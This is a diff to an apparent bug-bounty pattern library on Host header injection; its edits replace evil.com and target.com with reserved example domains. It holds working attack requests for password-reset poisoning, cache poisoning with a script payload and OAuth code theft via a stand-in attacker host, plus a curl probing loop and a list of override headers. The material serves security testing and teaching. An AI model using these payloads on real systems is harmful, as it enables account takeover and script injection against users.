@@ -11,7 +11,7 @@ Pattern library built from 16 public bug bounty reports.
 **Request:**
 ```http
 POST /forgot-password HTTP/1.1
-Host: evil.com
+Host: evil.example
 Content-Type: application/x-www-form-urlencoded
 
 email=victim@company.com
@@ -19,10 +19,10 @@ email=victim@company.com
 
 **Email received by victim:**
 ```
-Reset your password: https://evil.com/reset?token=abc123def456
+Reset your password: https://evil.example/reset?token=abc123def456
 ```
 
-**Impact:** Token intercepted at evil.com → full ATO for any account.
+**Impact:** Token intercepted at evil.example → full ATO for any account.
 
 ---
 
@@ -33,8 +33,8 @@ Reset your password: https://evil.com/reset?token=abc123def456
 **Request:**
 ```http
 POST /forgot-password HTTP/1.1
-Host: target.com
-X-Forwarded-Host: evil.com
+Host: target.example
+X-Forwarded-Host: evil.example
 Content-Type: application/x-www-form-urlencoded
 
 email=victim@company.com
@@ -51,13 +51,13 @@ email=victim@company.com
 **Poisoning request:**
 ```http
 GET / HTTP/1.1
-Host: target.com
-X-Forwarded-Host: evil.com"><script>alert(document.domain)</script>
+Host: target.example
+X-Forwarded-Host: evil.example"><script>alert(document.domain)</script>
 ```
 
 **Vulnerable response (cached):**
 ```html
-<link rel="canonical" href="https://evil.com"><script>alert(document.domain)</script>/"/>
+<link rel="canonical" href="https://evil.example"><script>alert(document.domain)</script>/"/>
 ```
 
 **Cached by CDN → served to all users for cache TTL duration.**
@@ -88,10 +88,10 @@ X-Forwarded-For: 127.0.0.1
 **Attack request:**
 ```http
 GET /oauth/authorize?response_type=code&client_id=app HTTP/1.1
-Host: evil.com
+Host: evil.example
 ```
 
-**Redirect registered with IdP:** `https://evil.com/oauth/callback?code=AUTH_CODE`
+**Redirect registered with IdP:** `https://evil.example/oauth/callback?code=AUTH_CODE`
 
 **Impact:** Auth code delivered to attacker → full ATO.
 
@@ -104,8 +104,8 @@ Host: evil.com
 **Any email containing a link that uses the Host header** is potentially poisonable.
 
 ```
-Welcome to target.com!
-Verify your email: https://evil.com/verify?token=TOKEN
+Welcome to target.example!
+Verify your email: https://evil.example/verify?token=TOKEN
 ```
 
 **Requires:** Attacker registers with attacker-controlled email, triggers email to victim.
@@ -120,8 +120,8 @@ Verify your email: https://evil.com/verify?token=TOKEN
 | `X-Host` | Custom framework parsing |
 | `X-Forwarded-Server` | HAProxy trust |
 | `X-HTTP-Host-Override` | Legacy middleware |
-| `Host: target.com:evil.com` | Port parsing confusion |
-| `Forwarded: host=evil.com` | RFC 7239 compliant proxy |
+| `Host: target.example:evil.example` | Port parsing confusion |
+| `Forwarded: host=evil.example` | RFC 7239 compliant proxy |
 | `X-Original-URL: /` | ASP.NET URL rewriting |
 | `X-Rewrite-URL: /` | Apache mod_rewrite |
 
@@ -133,8 +133,8 @@ Verify your email: https://evil.com/verify?token=TOKEN
 # Test all headers
 for H in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override"; do
   echo "=== $H ==="
-  curl -s -I "https://target.com/forgot-password" \
-    -H "$H: evil.com" | grep -i "location\|set-cookie"
+  curl -s -I "https://target.example/forgot-password" \
+    -H "$H: evil.example" | grep -i "location\|set-cookie"
 done
 
 # Param Miner (Burp Extension) — automatic header injection fuzzing
